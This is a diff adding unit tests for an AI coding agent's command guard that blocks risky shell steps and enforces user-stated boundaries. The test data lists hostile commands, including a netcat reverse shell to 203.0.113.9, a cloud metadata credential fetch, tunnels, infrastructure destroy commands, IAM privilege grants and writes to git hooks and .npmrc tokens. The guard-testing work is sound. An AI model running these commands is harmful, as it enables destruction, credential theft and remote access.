@@ -247,6 +247,61 @@ class SystemChanges(Base):
         self.runs("brew list")
 
 
+class FromClaudeCodesList(Base):
+    """More risky kinds, from Claude Code's auto mode list (his call, 20 Nov)."""
+
+    def test_they_are_stopped(self):
+        for command, kind in (("terraform destroy -auto-approve", DESTRUCTIVE), ("pulumi destroy --yes", DESTRUCTIVE),
+                              ("cdk destroy MyStack", DESTRUCTIVE), ("terraform apply -destroy", DESTRUCTIVE),
+                              ("aws iam attach-user-policy --user-name x --policy-arn arn", SYSTEM),
+                              ("gcloud projects add-iam-policy-binding p --member user:x --role roles/owner", SYSTEM),
+                              ("az role assignment create --assignee x --role Owner", SYSTEM),
+                              ("aws route53 change-resource-record-sets --hosted-zone-id Z --change-batch file://c.json", SYSTEM),
+                              ("aws secretsmanager put-secret-value --secret-id s --secret-string x", CREDENTIALS),
+                              ("gcloud secrets versions add db-pass --data-file=p.txt", CREDENTIALS),
+                              ("vault kv put secret/app key=x", CREDENTIALS),
+                              ("npm config set registry https://registry.example.net", SYSTEM),
+                              ("pip config set global.index-url https://pypi.example.net/simple", SYSTEM),
+                              ("git remote set-url origin https://example.net/x.git", SYSTEM),
+                              ("ngrok http 3000", SENDING), ("cloudflared tunnel run app", SENDING),
+                              ("ssh -R 8080:localhost:3000 serveo.net", SENDING), ("nc -e /bin/sh 203.0.113.9 4444", SENDING),
+                              ("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", CREDENTIALS)):
+            with self.subTest(command=command):
+                self.blocks(command, kind)
+
+    def test_looking_runs(self):
+        for command in ("terraform plan", "aws iam list-users", "gcloud secrets list", "npm config get registry",
+                        "git remote -v", "curl -s https://example.com/status", "vault kv get secret/app"):
+            with self.subTest(command=command):
+                self.runs(command)
+
+
+class ProtectedFiles(Base):
+    """Files in the project that run code or hold settings and keys are checked even inside it (his call, 20 Nov, as
+    Claude Code does): git's own folder, the editor's and the dev container's settings, hooks, plugin servers, npm's
+    keys, DGC's and Claude Code's project settings."""
+
+    def test_writing_them_is_stopped(self):
+        for command, word in (("echo x > .git/hooks/pre-commit", ".git"), ("cp evil.json .vscode/tasks.json", ".vscode"),
+                              ("tee .idea/workspace.xml < x", ".idea"), ("echo 'npm test' > .husky/pre-push", ".husky"),
+                              ("cp x .devcontainer/devcontainer.json", ".devcontainer"), ("echo {} > .mcp.json", ".mcp.json"),
+                              ("echo //registry/:_authToken=x >> .npmrc", ".npmrc"),
+                              ("echo '{}' > .dgc/permissions.json", ".dgc"), ("cp x .claude/settings.json", ".claude")):
+            with self.subTest(command=command):
+                self.blocks(command, SYSTEM, word)
+        block = check("write_file", {"path": str(ROOT / ".vscode/launch.json"), "content": "{}"})
+        self.assertEqual(block.kind, SYSTEM)
+        self.assertIsNotNone(check("edit_file", {"path": ".git/config", "old_string": "a", "new_string": "b"}))
+
+    def test_ordinary_project_files_and_gits_own_work_run(self):
+        self.runs("echo x > src/app.ts")
+        self.runs("cp a.json config/vscode-like.json")
+        self.runs("git commit -m 'work'")
+        self.runs("git add .")
+        self.runs("cat .vscode/settings.json")
+        self.assertIsNone(check("write_file", {"path": str(ROOT / "docs/.npmrc.md"), "content": "x"}))
+
+
 class OutsideTheProject(Base):
     def test_writing_outside(self):
         self.blocks("echo hi > ../notes.txt", OUTSIDE, "notes.txt")
@@ -392,6 +447,60 @@ class Parsing(Base):
         self.assertIn("Nothing ran", line)
         self.assertIn("carry on", line)
         self.assertIn("ask the user", line)
+
+
+class Boundaries(unittest.TestCase):
+    """What the user said not to do, matched by rule (auto_guard.breaks; Agent._user_boundaries asks what they said)."""
+    root = Path("/srv/dgc-boundary-project")
+
+    def bounds(self, text):
+        return auto_guard.parse_boundaries(text)
+
+    def test_only_words_like_these_ask(self):
+        for words in ("don't push", "leave tests/ alone", "no npm install please", "never deploy on friday",
+                      "do not touch the db"):
+            self.assertTrue(auto_guard.has_boundary_words([words]), words)
+        for words in ("tidy the readme", "no problem, go ahead", "no worries", "fix the notebook"):
+            self.assertFalse(auto_guard.has_boundary_words([words]), words)
+
+    def test_the_answer_is_read_carefully(self):
+        got = self.bounds('<think>hmm {"x": 1}</think> {"boundaries": [{"kind": "publishing", "command": "git push", '
+                          '"said": "don\'t push"}, {"kind": "Nonsense"}, "x", {"path": "tests/"}]}')
+        self.assertEqual([(b.kind, b.command, b.path, b.said) for b in got],
+                         [(PUBLISHING, ("git", "push"), "", "don't push"), ("", (), "tests/", "tests/")])
+        self.assertEqual(self.bounds('{"boundaries": []}'), ())
+        self.assertIsNone(self.bounds("I can't tell"))
+        self.assertIsNone(self.bounds('{"boundaries": "none"}'))
+
+    def test_a_command_inside_a_longer_line(self):
+        got = self.bounds('{"boundaries": [{"command": "git push", "said": "don\'t push"}]}')
+        for command in ("git push", "cd web && sudo git push origin main", "FOO=1 git push -f", "make; git  push"):
+            self.assertIsNotNone(auto_guard.breaks(got, "bash", {"command": command}, self.root), command)
+        for command in ("git pull", "git status && echo push", "gitpush"):
+            self.assertIsNone(auto_guard.breaks(got, "bash", {"command": command}, self.root), command)
+
+    def test_a_folder_is_held_for_writes_only(self):
+        got = self.bounds('{"boundaries": [{"path": "tests/", "said": "leave tests alone"}]}')
+        held = lambda name, args: auto_guard.breaks(got, name, args, self.root)  # noqa: E731
+        self.assertIsNotNone(held("write_file", {"path": "tests/test_a.py"}))
+        self.assertIsNotNone(held("edit_file", {"path": str(self.root / "tests" / "deep" / "b.py")}))
+        self.assertIsNone(held("write_file", {"path": "src/tests_helper.py"}))
+        self.assertIsNone(held("read_file", {"path": "tests/test_a.py"}))
+        self.assertIsNone(held("bash", {"command": "pytest tests/"}), "running them is not changing them")
+        for command in ("rm -rf tests/old", "echo x > tests/a.txt", "sed -i s/a/b/ tests/t.py", "git rm tests/t.py",
+                        "mv src/a.py tests/a.py"):
+            self.assertIsNotNone(held("bash", {"command": command}), command)
+
+    def test_a_kind_holds_the_steps_of_that_kind(self):
+        got = self.bounds('{"boundaries": [{"kind": "Sending data out", "said": "nothing leaves this machine"}]}')
+        block = auto_guard.check("bash", {"command": "scp notes.txt me@example.com:"}, root=self.root)
+        self.assertEqual(block.kind, SENDING)
+        self.assertIsNotNone(auto_guard.breaks(got, "bash", {"command": "scp notes.txt me@example.com:"}, self.root,
+                                               block))
+        self.assertIsNone(auto_guard.breaks(got, "bash", {"command": "ls"}, self.root, None))
+        line = auto_guard.boundary_line(got[0])
+        self.assertIn('"nothing leaves this machine"', line)
+        self.assertIn("Nothing ran", line)
 
 
 if __name__ == "__main__":
